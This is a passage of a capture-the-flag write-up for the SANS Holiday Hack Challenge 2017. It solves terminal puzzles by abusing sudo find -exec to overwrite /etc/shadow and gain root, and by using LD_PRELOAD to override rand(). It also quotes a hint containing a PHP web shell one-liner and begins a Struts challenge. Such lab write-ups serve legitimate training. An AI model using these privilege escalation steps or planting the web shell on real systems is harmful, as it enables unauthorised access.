From this game: <a href="https://2017.holidayhackchallenge.com/game/f09180b7-43e4-406c-83ac-924539e7b8f5">https://2017.holidayhackchallenge.com/game/f09180b7-43e4-406c-83ac-924539e7b8f5</a>
</p>

<p>
Direct link: <a href="https://docker2017.holidayhackchallenge.com/?challenge=a9d07a00-55bc-4391-a02b-71f3c4f1ec44&uid=USER_ID">https://docker2017.holidayhackchallenge.com/?challenge=a9d07a00-55bc-4391-a02b-71f3c4f1ec44&uid=USER_ID</a>
</p>


<div class="figure">
<p><img src="./images/terminal-location-we_are.png" alt="terminal-location-we_are.png" />
</p>
<p><span class="figure-number">Figure 10:</span> The terminal is just behind the starting ramp on the main platform.</p>
</div>
</div>
</li>

<li><a id="background-information" name="background-information"></a><a id="sec-5-7-1-3" name="sec-5-7-1-3"></a>Background Information<br  /><div class="outline-text-5" id="text-background-information">

<p>
We're logged in as the user <code>elf</code>. We happen to know that
<code>/etc/shadow</code> is where *NIX systems store the password hashes for
their users.
</p>

<p>
The system MOTD gives us a hint:
</p>

<blockquote>
<p>
What commands can you run with sudo?
</p>
</blockquote>

<p>
We also know that <code>sudo</code> is a program that allows us to run commands with the privileges of other users and/or groups.
</p>
</div>
</li>

<li><a id="goal" name="goal"></a><a id="sec-5-7-1-4" name="sec-5-7-1-4"></a>Goal<br  /><div class="outline-text-5" id="text-goal">

<p>
We need to overwrite /etc/shadow with /etc/shadow.bak. Basically we
need to <code>cp /etc/shadow.bak /etc/shadow</code>, except that we don't have
permissions to do that directly:
</p>

<div class="org-src-container">

<pre class="src src-sh">elf@784e43534178:~$ cp /etc/shadow.bak /etc/shadow
cp: cannot create regular file <span style="font-style: italic;">'/etc/shadow'</span>: Permission denied
</pre>
</div>
</div>
</li>

<li><a id="approach" name="approach"></a><a id="sec-5-7-1-5" name="sec-5-7-1-5"></a>Hints<br  /><div class="outline-text-5" id="text-approach">

<p>
<a href="https://twitter.com/ClimbALLdaTrees">Shinny Upatree on Twitter has a few hints</a>
</p>
<ul class="org-ul">
<li>[[<a href="https://twitter.com/ClimbALLdaTrees/status/938578034113765376][You">https://twitter.com/ClimbALLdaTrees/status/938578034113765376][You</a> know that feeling when something horrible has happened? So I was editing /etc/shadow manually, and&#x2026; well:
</li>
</ul>
<p>
$ ls -l /etc/shadow
-rw-rw-&#x2014; 1 root shadow 0 Dec  7 01:13 /etc/shadow
</p>

<p>
@1Horse1OSSleigh tells me the "Non-default shadow group permissions" might help&#x2026;. okay?]
</p>
<ul class="org-ul">
<li><a href="https://twitter.com/ClimbALLdaTrees/status/938578359860174848">I think I have some pseudo (sp?) permissions on this Unix server, but I don't know what that means. @GreenesterElf said this was a "learning opportunity" and won't give me the answer :'(</a>
</li>
</ul>
</div>
</li>

<li><a id="approach" name="approach"></a><a id="sec-5-7-1-6" name="sec-5-7-1-6"></a>Approach<br  /><div class="outline-text-5" id="text-approach">

<p>
If we follow the hint, we should try to figure out what commands we can run with sudo. Let's run <code>sudo -h</code> to view the help documentation:
</p>

<pre class="example">
sudo - execute a command as another user
...
  -l, --list                  list user's privileges or check a specific command; use twice for longer format
...
</pre>

<p>
To follow the hint, we should run sudo with the <code>--list</code> option, to see what our privileges are:
</p>

<div class="org-src-container">

<pre class="src src-sh">elf@784e43534178:~$ sudo --list
Matching Defaults entries for elf on 784e43534178:
    env_reset, mail_badpass, <span style="font-weight: bold; font-style: italic;">secure_path</span>=/usr/local/sbin<span style="font-style: italic;">\:</span>/usr/local/bin<span style="font-style: italic;">\:</span>/usr/sbin<span style="font-style: italic;">\:</span>/usr/bin<span style="font-style: italic;">\:</span>/sbin<span style="font-style: italic;">\:</span>/bin<span style="font-style: italic;">\:</span>/snap/bin

User elf may run the following commands on 784e43534178:
    (elf : shadow) NOPASSWD: /usr/bin/find
</pre>
</div>

<p>
We can run the find command, but it also mentions something about shadow. Let's give it a shot:
</p>

<div class="org-src-container">

<pre class="src src-sh">elf@784e43534178:~$ sudo find
[sudo] password for elf:
</pre>
</div>

<p>
We don't know the password. The sudo output said we should be able to
run this without a password ("NOPASSWD"). Something's not quite
right. We can run sudo with <code>-l -l</code> as the help output said to get
some more verbose output:
</p>

<div class="org-src-container">

<pre class="src src-sh">elf@784e43534178:~$ sudo -l -l
Matching Defaults entries for elf on 784e43534178:
    env_reset, mail_badpass, <span style="font-weight: bold; font-style: italic;">secure_path</span>=/usr/local/sbin<span style="font-style: italic;">\:</span>/usr/local/bin<span style="font-style: italic;">\:</span>/usr/sbin<span style="font-style: italic;">\:</span>/usr/bin<span style="font-style: italic;">\:</span>/sbin<span style="font-style: italic;">\:</span>/bin<span style="font-style: italic;">\:</span>/snap/bin

User elf may run the following commands on 784e43534178:
Sudoers entry:
    RunAsUsers: elf
    RunAsGroups: shadow
    Options: !authenticate
    Commands:
        /usr/bin/find
</pre>
</div>

<p>
Ok. So sudo lets us run the find command as the user elf, and the group shadow. Viewing <code>sudo -h</code> one more time shows us that there's an option we want to set our group to <code>shadow</code>:
</p>
<pre class="example">
-g, --group=group           run command as the specified group name or ID
</pre>

<div class="org-src-container">

<pre class="src src-sh">elf@784e43534178:~$ sudo -g shadow find 
<span style="font-weight: bold;">.</span>
./.bashrc
./.bash_logout
./.profile
</pre>
</div>

<p>
This time, sudo let us run find without prompting us for a
password. So, we know that we can run commands as the elf user, and
the shadow group. Is this enough to overwrite <code>/etc/shadow</code>?
</p>

<div class="org-src-container">

<pre class="src src-sh">elf@784e43534178:~$ ls -l /etc/shadow
-rw-rw---- 1 root shadow 0 Dec 15 20:00 /etc/shadow
</pre>
</div>

<p>
Yes. <code>/etc/shadow</code> is owned by the root user and the shadow group, and
the group has write permissions to it. At this point, the only thing
that's left is figuring out how to use <code>find</code> in order to copy
<code>/etc/shadow.bak</code> to <code>/etc/shadow</code>. <code>find</code> has an exec option:
</p>

<pre class="example">
actions: -delete -print0 -printf FORMAT -fprintf FILE FORMAT -print 
      -fprint0 FILE -fprint FILE -ls -fls FILE -prune -quit
      -exec COMMAND ; -exec COMMAND {} + -ok COMMAND ;
      -execdir COMMAND ; -execdir COMMAND {} + -okdir COMMAND ;
</pre>

<p>
Let's give it a shot:
</p>
<div class="org-src-container">

<pre class="src src-sh">elf@784e43534178:~$ sudo -g shadow find -exec cp /etc/shadow.bak /etc/shadow <span style="font-style: italic;">\;</span>
</pre>
</div>

<p>
Looks like that worked:
</p>

<div class="org-src-container">

<pre class="src src-sh">elf@784e43534178:~$ inspect_da_box 
                     ___
                    / __<span style="font-style: italic;">'.     .-"""-.</span>
<span style="font-style: italic;">              .-""-| |  '</span>.<span style="font-style: italic;">'.  / .---. \</span>
<span style="font-style: italic;">             / .--. \ \___\ \/ /____| |</span>
<span style="font-style: italic;">            / /    \ `-.-;-(`_)_____.-'</span>._
           ; ;      <span style="font-weight: bold;">`.-" "-:_,(o:==..`</span>-. <span style="font-style: italic;">'.         .-"-,</span>
<span style="font-style: italic;">           | |      /       \ /      `\ `. \       / .-. \</span>
<span style="font-style: italic;">           \ \     |         Y    __...\  \ \     / /   \/</span>
<span style="font-style: italic;">     /\     | |    | .--""--.| .-'</span>      <span style="font-style: italic;">\ </span> <span style="font-style: italic;">'.`---'</span> /
     <span style="font-style: italic;">\ \ </span>  / /     |<span style="font-weight: bold;">`        \'   _...--.;   '---'`</span>
      <span style="font-style: italic;">\ '-'</span> / jgs  /_..---.._ <span style="font-style: italic;">\ </span>.<span style="font-style: italic;">'\\_     `.</span>
<span style="font-style: italic;">       `--'</span><span style="font-weight: bold;">`      .'    (_)  `</span><span style="font-style: italic;">'/   (_)     /</span>
<span style="font-style: italic;">                  `._       _.'</span>|         <span style="font-weight: bold;">.</span><span style="font-style: italic;">'</span>
<span style="font-style: italic;">                     ```````    '</span>-...--<span style="font-style: italic;">'`</span>
<span style="font-style: italic;">/etc/shadow has been successfully restored!</span>
</pre>
</div>
</div>
</li>

<li><a id="solution" name="solution"></a><a id="sec-5-7-1-7" name="sec-5-7-1-7"></a>Solution<br  /><div class="outline-text-5" id="text-solution">

<p>
A one-liner is:
</p>

<div class="org-src-container">

<pre class="src src-sh">sudo -g shadow find -exec cp /etc/shadow.bak /etc/shadow <span style="font-style: italic;">\;</span> &amp;&amp; inspect_da_box
</pre>
</div>

<p>
AsciiCinema video of the solution?
</p>
</div>
</li>

<li><a id="common-pitfalls" name="common-pitfalls"></a><a id="sec-5-7-1-8" name="sec-5-7-1-8"></a>Common Pitfalls<br  /><div class="outline-text-5" id="text-common-pitfalls">

<p>
<code>find</code>'s exec syntax is a little weird, and a common mistake is forgetting to escape the semicolon at the end:
</p>

<div class="org-src-container">

<pre class="src src-sh">elf@784e43534178:~$ sudo -g shadow find -exec cp /etc/shadow.bak /etc/shadow ;
find: missing argument to <span style="font-weight: bold;">`-exec'</span>
</pre>
</div>

<p>
Another issue is just the fact that sudo is often set up for user
permissions, and not group permissions, so the <code>-g</code> flag is less well
known.
</p>
</div>
</li>

<li><a id="sec-5-7-1-9" name="sec-5-7-1-9"></a>Going Further - Privilege Escalation<br  /><div class="outline-text-5" id="text-5-7-1-9">
<p>
This is neat, but let's elevate privileges to root on this
terminal. Our approach will be to put in a modified shadow file
instead, which will have a password we know for the root user.
</p>

<p>
First, let's generate the password hash in the right format:
</p>

<div class="org-src-container">

<pre class="src src-sh">elf@784e43534178:~$ echo <span style="font-style: italic;">"password"</span> | openssl passwd -1 -stdin
$<span style="font-weight: bold; font-style: italic;">1</span>$<span style="font-weight: bold; font-style: italic;">wDLzsvsW</span>$<span style="font-weight: bold; font-style: italic;">0</span>.aZ24yCO8xhhjnfHUIG3/
</pre>
</div>

<p>
Now that we have a hash, we'll use sed to modify the <code>/etc/shadow.bak</code>
file to have that for root's password. Remember to be careful in
escaping special characters in the sed command line.
</p>

<div class="org-src-container">

<pre class="src src-sh">elf@784e43534178:~$ sed -e <span style="font-style: italic;">'s/root:\*/root:$1$wDLzsvsW$0.aZ24yCO8xhhjnfHUIG3/'</span> /etc/shadow.bak | tee better.shadow
root:$<span style="font-weight: bold; font-style: italic;">1</span>$<span style="font-weight: bold; font-style: italic;">WPvxfOOK</span>$<span style="font-weight: bold; font-style: italic;">JqDBD</span>/DPQlpkUBOC3qTp51:17484:0:99999:7:::
daemon:*:17484:0:99999:7:::
bin:*:17484:0:99999:7:::
sys:*:17484:0:99999:7:::
sync:*:17484:0:99999:7:::
games:*:17484:0:99999:7:::
...
</pre>
</div>

<p>
Now, we re-run our find command, and find that we can escalate to root with a password of <code>password</code>:
</p>

<div class="org-src-container">

<pre class="src src-sh">elf@784e43534178:~$ sudo -g shadow find -exec cp better.shadow /etc/shadow <span style="font-style: italic;">\;</span>
elf@784e43534178:~$ su
Password: 
root@784e43534178:/home/elf# id  
<span style="font-weight: bold; font-style: italic;">uid</span>=0(root) <span style="font-weight: bold; font-style: italic;">gid</span>=0(root) <span style="font-weight: bold; font-style: italic;">groups</span>=0(root)
</pre>
</div>
</div>
</li></ul>
</div>
</div>
<div id="outline-container-sec-5-8" class="outline-3">
<h3 id="sec-5-8">We're Off To See The</h3>
<div class="outline-text-3" id="text-5-8">
</div><div id="outline-container-title" class="outline-4">
<h4 id="title"><a id="sec-5-8-1" name="sec-5-8-1"></a>We're Off To See The&#x2026;</h4>
<div class="outline-text-4" id="text-title">
</div>

<ul class="org-ul"><li><a id="question" name="question"></a><a id="sec-5-8-1-1" name="sec-5-8-1-1"></a>Question<br  /><div class="outline-text-5" id="text-question">

<pre class="example">
                 .--._.--.--.__.--.--.__.--.--.__.--.--._.--.
               _(_      _Y_      _Y_      _Y_      _Y_      _)_
              [___]    [___]    [___]    [___]    [___]    [___]
              /:' \    /:' \    /:' \    /:' \    /:' \    /:' \
             |::   |  |::   |  |::   |  |::   |  |::   |  |::   |
             \::.  /  \::.  /  \::.  /  \::.  /  \::.  /  \::.  /
         jgs  \::./    \::./    \::./    \::./    \::./    \::./
               '='      '='      '='      '='      '='      '='


Wunorse Openslae has a special challenge for you.
Run the given binary, make it return 42.
Use the partial source for hints, it is just a clue.
You will need to write your own code, but only a line or two.
</pre>
</div>
</li>

<li><a id="how-to-find-the-terminal" name="how-to-find-the-terminal"></a><a id="sec-5-8-1-2" name="sec-5-8-1-2"></a>How to find the terminal<br  /><div class="outline-text-5" id="text-how-to-find-the-terminal">

<p>
From this game: <a href="https://2017.holidayhackchallenge.com/game/30a9c19a-f931-4367-9922-d20b91314eec">https://2017.holidayhackchallenge.com/game/30a9c19a-f931-4367-9922-d20b91314eec</a>
</p>

<p>
Direct link: <a href="https://docker2017.holidayhackchallenge.com/?challenge=96452ffb-5153-4473-9fe4-f0ff7921308e&uid=USER_ID">https://docker2017.holidayhackchallenge.com/?challenge=96452ffb-5153-4473-9fe4-f0ff7921308e&uid=USER_ID</a>
</p>


<div class="figure">
<p><img src="./images/terminal-location-off.png" alt="terminal-location-off.png" />
</p>
<p><span class="figure-number">Figure 11:</span> The terminal is on a peak off to the side.</p>
</div>
</div>
</li>

<li><a id="background-information" name="background-information"></a><a id="sec-5-8-1-3" name="sec-5-8-1-3"></a>Background Information<br  /><div class="outline-text-5" id="text-background-information">

<p>
We are logged in as the user <code>elf</code>.
</p>

<p>
The system motd tells us:
</p>

<blockquote>
<p>
Run the given binary, make it return 42.
Use the partial source for hints, it is just a clue.
You will need to write your own code, but only a line or two.
</p>
</blockquote>

<p>
Two files are provided
</p>

<div class="org-src-container">

<pre class="src src-sh">-rwxr-xr-x 1 root root 84824 Dec 16 16:47 isit42
-rw-r--r-- 1 root root   654 Dec 15 19:59 isit42.c.un
</pre>
</div>
</div>
</li>

<li><a id="goal" name="goal"></a><a id="sec-5-8-1-4" name="sec-5-8-1-4"></a>Goal<br  /><div class="outline-text-5" id="text-goal">

<p>
For this challenge we need to write our own code in order to make the provided binary <code>isit42</code> return 42.
</p>
</div>
</li>

<li><a id="hints" name="hints"></a><a id="sec-5-8-1-5" name="sec-5-8-1-5"></a>Hints<br  /><div class="outline-text-5" id="text-hints">

<p>
<a href="https://twitter.com/1Horse1OSSleigh">Wunorse Openslae (that's a stretch) on Twitter actually has no useful hints</a>
</p>

<p>
This blog post, <a href="https://pen-testing.sans.org/blog/2017/12/06/go-to-the-head-of-the-class-ld-preload-for-the-win">Go To The Head Of The Class: LD_PRELOAD For The Win</a>, by Jeff McJunkin was useful.
</p>
</div>
</li>

<li><a id="approach" name="approach"></a><a id="sec-5-8-1-6" name="sec-5-8-1-6"></a>Approach<br  /><div class="outline-text-5" id="text-approach">

<p>
[[<a href="https://ncsa.github.io/sans-holiday-hack-2016/#org42386a9][Our">https://ncsa.github.io/sans-holiday-hack-2016/#org42386a9][Our</a> team actually did this exact thing last year in order to derandomize <code>wumpus</code>.
</p>

<p>
In this case looking at the source code we can identify the exact code that is being used to randomize the program:
</p>

<div class="org-src-container">

<pre class="src src-sh">int getrand() {
    srand((unsigned int)<span style="font-weight: bold;">time</span>(NULL)); 
    <span style="font-weight: bold;">printf</span>(<span style="font-style: italic;">"Calling rand() to select a random number.\n"</span>);
    // The prototype for rand is: int rand(void);
    <span style="font-weight: bold;">return</span> rand() % 4096; // returns a pseudo-random integer between 0 and 4096
}
</pre>
</div>

<p>
If we create our own library file to define <code>rand()</code> we can remove the randomness.
</p>
</div>
</li>

<li><a id="solution" name="solution"></a><a id="sec-5-8-1-7" name="sec-5-8-1-7"></a>Solution<br  /><div class="outline-text-5" id="text-solution">

<p>
As mentioned in the hints section above, we can use <a href="https://pen-testing.sans.org/blog/2017/12/06/go-to-the-head-of-the-class-ld-preload-for-the-win">Jeff McJunkin's</a> blog post for guidance on how to complete this challenge.
</p>

<p>
First we'll need to create our own library. We can call it 'rand.c'.
</p>

<div class="org-src-container">

<pre class="src src-sh">int rand(unsigned int *seed) {
    <span style="font-weight: bold;">return</span> 42;
}
</pre>
</div>

<p>
Then we compile it using the suggested flags in the article.
</p>

<div class="org-src-container">

<pre class="src src-sh">elf@784e43534178:~$ gcc -o rand -ldl -shared -fPIC rand.c
</pre>
</div>

<p>
Once compiled we can then use LD_PRELOAD to load our library.
</p>

<div class="org-src-container">

<pre class="src src-sh">elf@784e43534178:~$ <span style="font-weight: bold; font-style: italic;">LD_PRELOAD</span>=<span style="font-weight: bold;">`pwd`</span>/rand ./isit42
Starting up ... done.
Calling rand() to select a random number.
                 .-. 
                <span style="font-weight: bold;">.</span>;;<span style="font-style: italic;">\ </span>||           _______  __   __  _______    _______  __    _  _______  _     _  _______  ______ 
               /::::<span style="font-style: italic;">\|</span>/          |       ||  | |  ||       |  |   _   ||  |  | ||       || | _ | ||       ||    _ |
              /::::<span style="font-style: italic;">'();          |_     _||  |_|  ||    ___|  |  |_|  ||   |_| ||  _____|| || || ||    ___||   | ||</span>
<span style="font-style: italic;">            |\/`\:_/`\/|           |   |  |       ||   |___   |       ||       || |_____ |       ||   |___ |   |_||_ </span>
<span style="font-style: italic;">        ,__ |0_..().._0| __,       |   |  |       ||    ___|  |       ||  _    ||_____  ||       ||    ___||    __  |</span>
<span style="font-style: italic;">         \,`////""""\\\\`,/        |   |  |   _   ||   |___   |   _   || | |   | _____| ||   _   ||   |___ |   |  | |</span>
<span style="font-style: italic;">         | )//_ o  o _\\( |        |___|  |__| |__||_______|  |__| |__||_|  |__||_______||__| |__||_______||___|  |_|</span>
<span style="font-style: italic;">          \/|(_) () (_)|\/ </span>
<span style="font-style: italic;">            \   '</span>()<span style="font-style: italic;">'   /            ______    _______  _______  ___      ___      __   __    ___   _______ </span>
<span style="font-style: italic;">            _:.______.;_           |    _ |  |       ||   _   ||   |    |   |    |  | |  |  |   | |       |</span>
<span style="font-style: italic;">          /| | /`\/`\ | |\         |   | ||  |    ___||  |_|  ||   |    |   |    |  |_|  |  |   | |  _____|</span>
<span style="font-style: italic;">         / | | \_/\_/ | | \        |   |_||_ |   |___ |       ||   |    |   |    |       |  |   | | |_____ </span>
<span style="font-style: italic;">        /  |o`""""""""`o|  \       |    __  ||    ___||       ||   |___ |   |___ |_     _|  |   | |_____  |</span>
<span style="font-style: italic;">       `.__/     ()     \__.'</span>      |   |  | ||   |___ |   _   ||       ||       |  |   |    |   |  _____| |
       |  | ___      ___ |  |      |___|  |_||_______||__| |__||_______||_______|  |___|    |___| |_______|
       /  <span style="font-style: italic;">\|</span>---|    |---|/  <span style="font-style: italic;">\ </span>
       |  (|42 | () | DA|)  |       _   ___  _______ 
       <span style="font-style: italic;">\ </span> /;---<span style="font-style: italic;">'    '</span>---;<span style="font-style: italic;">\ </span> /      | | |   ||       |
        <span style="font-weight: bold;">``</span> <span style="font-style: italic;">\ </span>___ /<span style="font-style: italic;">\ </span>___ / <span style="font-weight: bold;">``</span>       | |_|   ||____   |
            <span style="font-weight: bold;">`|  |  |  |`</span>           |       | ____|  |
      jgs    |  |  |  |            |___    || ______| ___ 
       _._  |<span style="font-style: italic;">\|\/</span>||<span style="font-style: italic;">\/</span>|/|  _._          |   || |_____ |   |
      / .-<span style="font-style: italic;">\ </span>|~~~~||~~~~| /-. <span style="font-style: italic;">\ </span>        |___||_______||___|
      | <span style="font-style: italic;">\_</span>_.<span style="font-style: italic;">'    ||    '</span>.__/ |
       <span style="font-weight: bold;">`---------''---------`</span> 
Congratulations! You<span style="font-style: italic;">'ve won, and have successfully completed this challenge.</span>
</pre>
</div>
</div>
</li>


<li><a id="alternatives" name="alternatives"></a><a id="sec-5-8-1-8" name="sec-5-8-1-8"></a>Alternatives<br  /><div class="outline-text-5" id="text-alternatives">

<p>
Another option is to just brute force it.  The sample code shows that the program is using
</p>


<div class="org-src-container">

<pre class="src src-c"><span style="font-weight: bold;">return</span> rand() % 4096; <span style="font-weight: bold; font-style: italic;">// </span><span style="font-weight: bold; font-style: italic;">returns a pseudo-random integer between 0 and 4096</span>
</pre>
</div>

<p>
This means we should only need to run the program a few thousand times for the
result to be 42.  However, if we try to run the program too quickly, we notice
we get the same output each time:
</p>

<div class="org-src-container">

<pre class="src src-sh">elf@5f015af49eab:~$ ./isit42 &amp; ./isit42 &amp;
[1] 31
[2] 32
elf@5f015af49eab:~$ Starting up ... Starting up ... done.
Calling rand() to select a random number.
done.
Calling rand() to select a random number.
945 is not 42.
945 is not 42.
[1]-  Exit 177                ./isit42
[2]+  Exit 177                ./isit42
</pre>
</div>


<p>
This is because the program uses the current timestamp in seconds as a random
seed. Running the program more than once a second will not help us.
</p>

<p>
If we run this:
</p>
<div class="org-src-container">

<pre class="src src-sh">elf@784e43534178:~$ while true;<span style="font-weight: bold;">do</span> ./isit42 ; <span style="font-weight: bold;">done</span>
</pre>
</div>

<p>
We will get a different answer ever time, but since the program contains a
sleep(3) that will only run one attempt every 3 seconds instead of one attempt
per second.  To fix this, we can run each attempt in the background using &amp;,
sleeping 1 second between attempts:
</p>


<div class="org-src-container">

<pre class="src src-sh">elf@784e43534178:~$ while true;<span style="font-weight: bold;">do</span> ./isit42 &amp;sleep 1;<span style="font-weight: bold;">done</span>
</pre>
</div>

<p>
After a short wait, it succeeds:
</p>

<div class="org-src-container">

<pre class="src src-sh">Calling rand() to select a random number.
[860]   Exit 37                 ./isit42
[865] 1869
Starting up ... 3566 is not 42.
done.
Calling rand() to select a random number.
[861]   Exit 199                ./isit42
[866] 1871
Starting up ...                  .-.
                <span style="font-weight: bold;">.</span>;;<span style="font-style: italic;">\ </span>||           _______  __   __  _______    _______  __    _  _______  _     _  _______  ______
               /::::<span style="font-style: italic;">\|</span>/          |       ||  | |  ||       |  |   _   ||  |  | ||       || | _ | ||       ||    _ |
              /::::<span style="font-style: italic;">'();          |_     _||  |_|  ||    ___|  |  |_|  ||   |_| ||  _____|| || || ||    ___||   | ||</span>
<span style="font-style: italic;">            |\/`\:_/`\/|           |   |  |       ||   |___   |       ||       || |_____ |       ||   |___ |   |_||_</span>
<span style="font-style: italic;">        ,__ |0_..().._0| __,       |   |  |       ||    ___|  |       ||  _    ||_____  ||       ||    ___||    __  |</span>
<span style="font-style: italic;">         \,`////""""\\\\`,/        |   |  |   _   ||   |___   |   _   || | |   | _____| ||   _   ||   |___ |   |  | |</span>
<span style="font-style: italic;">         | )//_ o  o _\\( |        |___|  |__| |__||_______|  |__| |__||_|  |__||_______||__| |__||_______||___|  |_|</span>
</pre>
</div>
</div>
</li>

<li><a id="common-pitfalls" name="common-pitfalls"></a><a id="sec-5-8-1-9" name="sec-5-8-1-9"></a>Common Pitfalls<br  /><div class="outline-text-5" id="text-common-pitfalls">

<p>
Do we know what issue(s) people were running into?
</p>
</div>
</li>

<li><a id="about-the-challenge" name="about-the-challenge"></a><a id="sec-5-8-1-10" name="sec-5-8-1-10"></a>About the Challenge<br  /><div class="outline-text-5" id="text-about-the-challenge">

<p>
How was the challenge setup? Was there a better way to secure this
system?
</p>
</div>
</li>

<li><a id="loot" name="loot"></a><a id="sec-5-8-1-11" name="sec-5-8-1-11"></a>Loot<br  /><div class="outline-text-5" id="text-loot">

<p>
Anything interesting hidden on the system?
</p>
</div>
</li></ul>
</div>
</div>
</div>
<div id="outline-container-sec-6" class="outline-2">
<h2 id="sec-6">Answers</h2>
<div class="outline-text-2" id="text-6">
</div><div id="outline-container-sec-6-1" class="outline-3">
<h3 id="sec-6-1"><span class="todo TODO">TODO</span> Question 1</h3>
<div class="outline-text-3" id="text-6-1">
</div><div id="outline-container-answer-template" class="outline-4">
<h4 id="answer-template"><a id="sec-6-1-1" name="sec-6-1-1"></a>Answer Template</h4>
<div class="outline-text-4" id="text-answer-template">
</div>

<ul class="org-ul"><li><a id="question" name="question"></a><a id="sec-6-1-1-1" name="sec-6-1-1-1"></a>Question<br  /><div class="outline-text-5" id="text-question">

<ol class="org-ol">
<li>Visit the North Pole and Beyond at the Winter Wonder Landing Level to
collect the first page of The Great Book using a giant snowball. What
is the title of that page?
</li>
</ol>
</div>
</li>

<li><a id="background-information" name="background-information"></a><a id="sec-6-1-1-2" name="sec-6-1-1-2"></a>Background Information<br  /><div class="outline-text-5" id="text-background-information">

<p>
This question simply requires playing the
<a href="https://2017.holidayhackchallenge.com/game/7e48d6aa-4b73-4027-b23b-a6a1a3460d54">Winter Wonder Landing</a>
game level.
</p>
</div>
</li>

<li><a id="goal" name="goal"></a><a id="sec-6-1-1-3" name="sec-6-1-1-3"></a>Goal<br  /><div class="outline-text-5" id="text-goal">

<p>
In this game we need to guide the snowball to collect the
<a href="https://www.holidayhackchallenge.com/2017/pages/6dda7650725302f59ea42047206bd4ee5f928d19/GreatBookPage1.pdf">first Great Book page</a>.
</p>
</div>
</li>

<li><a id="approach" name="approach"></a><a id="sec-6-1-1-4" name="sec-6-1-1-4"></a>Approach<br  /><div class="outline-text-5" id="text-approach">

<p>
You just need to redirect the snowball to roll over the page.
</p>
</div>
</li>

<li><a id="solution" name="solution"></a><a id="sec-6-1-1-5" name="sec-6-1-1-5"></a>Solution<br  /><div class="outline-text-5" id="text-solution">
</div>
</li></ul>
</div>

<div id="outline-container-sec-6-1-2" class="outline-4">
<h4 id="sec-6-1-2"><span class="todo TODO">TODO</span> Add visuals to this page</h4>
<div class="outline-text-4" id="text-6-1-2">
</div><ul class="org-ul"><li><a id="about-the-challenge" name="about-the-challenge"></a><a id="sec-6-1-2-1" name="sec-6-1-2-1"></a>About the Challenge<br  /><div class="outline-text-5" id="text-about-the-challenge">

<p>
This challenge was primarily to get players introduced to the game aspect of the Holiday Hack.
</p>
</div>
</li></ul>
</div>
</div>
<div id="outline-container-sec-6-2" class="outline-3">
<h3 id="sec-6-2"><span class="todo TODO">TODO</span> Question 2</h3>
<div class="outline-text-3" id="text-6-2">
</div><div id="outline-container-answer-template" class="outline-4">
<h4 id="answer-template"><a id="sec-6-2-1" name="sec-6-2-1"></a>Answer Template</h4>
<div class="outline-text-4" id="text-answer-template">
</div>

<ul class="org-ul"><li><a id="question" name="question"></a><a id="sec-6-2-1-1" name="sec-6-2-1-1"></a>Question<br  /><div class="outline-text-5" id="text-question">

<ol class="org-ol">
<li>Investigate the Letters to Santa application at
<a href="https://l2s.northpolechristmastown.com">https://l2s.northpolechristmastown.com</a>. What is the topic of The
Great Book page available in the web root of the server? What is
Alabaster Snowball's password?
</li>
</ol>
</div>
</li>

<li><a id="background-information" name="background-information"></a><a id="sec-6-2-1-2" name="sec-6-2-1-2"></a>Background Information<br  /><div class="outline-text-5" id="text-background-information">

<p>
We know that there is an application on <code>https://l2s.northpolechristmastown.com</code> that we need to investigate.
This webpage is publically accessible from the Internet and not appear to require any special measures to
access it. We do not know Alabaster password or username at the start of this challenge nor what type of
web service is running on the host.
</p>

<p>
The following hints were provided by Sparkle Redberry from completing the level
<a href="https://2017.holidayhackchallenge.com/game/3e813a9c-cb34-492e-a317-0dd99c8ca2e7">Winconceivable: The Cliffs of Winsanity</a>:
</p>
<ol class="org-ol">
<li>We're excited to debut the new Letters to Santa site this year. Alabaster worked hard on that project for over a year. I got to work with the development version of the site early on in the project lifecycle.
</li>
<li>Near the end of the development we had to rush a few things to get the new site moved to production. Some development content on the letter page should probably have been removed, but ended up marked as hidden to avoid added change control paperwork.
</li>
<li>Alabaster's primary backend experience is with Apache Struts. I love Apache and have a local instance set up on my home computer with a web shell. Web shells are great as a backdoor for me to access my system remotely. I just choose a really long complex file name so that no one else knows how to access it.
</li>
<li>A simple web shell is to create a PHP file in the web root with <code>&lt;?php echo "&lt;pre&gt;" . shell_exec($_GET['e']) . "&lt;/pre&gt;"; ?&gt;</code>. Then, I visit the URL with my commands. For example, <code>http://server/complexFileName.php?e=ls</code>.
</li>
<li>There are lots of different web shell tools available. <a href="https://gist.github.com/joswr1ght/22f40787de19d80d110b37fb79ac3985">You can get a simple PHP web shell that is easy to use here</a>.
</li>
<li>That business with Equal-Facts Inc was really unfortunate. I understand there are a lot of different exploits available for those vulnerable systems. Fortunately, Alabaster said he tested for CVE-2017-5638 and it was NOT vulnerable. Hope he checked the others too.
</li>
<li>Apache Struts uses XML. I always had problems making proper XML formatting because of special characters. I either had to encode my data or escape the characters properly so the XML wouldn't break. I actually just checked and there are lots of different exploits out there for vulnerable systems. <a href="https://pen-testing.sans.org/blog/2017/12/05/why-you-need-the-skills-to-tinker-with-publicly-released-exploit-code">Here is a useful article</a>.
</li>
<li>Pro developer tip: Sometimes developers hard code credentials into their development files. Never do this, or at least make sure you take them out before publishing them or putting them into production. You also should avoid reusing credentials for different services, even on the same system.
</li>
</ol>

<p>
The following SANS Pentest Blog posts were also very helpful for this challenge:
</p>
<ul class="org-ul">
<li><a href="https://pen-testing.sans.org/blog/2017/12/05/why-you-need-the-skills-to-tinker-with-publicly-released-exploit-code">Why You Need the Skills to Tinker with Publicly Released Exploit Code</a>
  Mentions Apache struts vulnerabilities, specifically CVE-2017-5638 and CVE-2017-9805 Code: <a href="https://github.com/chrisjd20/cve-2017-9805.py">https://github.com/chrisjd20/cve-2017-9805.py</a>
</li>
<li><a href="https://pen-testing.sans.org/blog/2017/12/06/a-spot-of-tee%20Restricted">A Spot of Tee</a>
  bash shell, and bypassing the I/O restriction with tee
</li>
</ul>
</div>
</li>

<li><a id="goal" name="goal"></a><a id="sec-6-2-1-3" name="sec-6-2-1-3"></a>Goal<br  /><div class="outline-text-5" id="text-goal">

<p>
There are two goals for this challenge. The first is to determine the topic of
the Great Book Page that is sitting on the web root of this server. The second
is to determine what Alabaster's password is.
</p>
</div>
</li>

<li><a id="approach" name="approach"></a><a id="sec-6-2-1-4" name="sec-6-2-1-4"></a>Approach<br  /><div class="outline-text-5" id="text-approach">

<p>
According to the second hint there might be development code left in the production code.
If we look at the source of <code>l2s</code> the following code pops out.
</p>

<div class="org-src-container">

<pre class="src src-html"><span style="font-weight: bold; font-style: italic;">&lt;!-- </span><span style="font-weight: bold; font-style: italic;">Development version </span><span style="font-weight: bold; font-style: italic;">--&gt;</span>
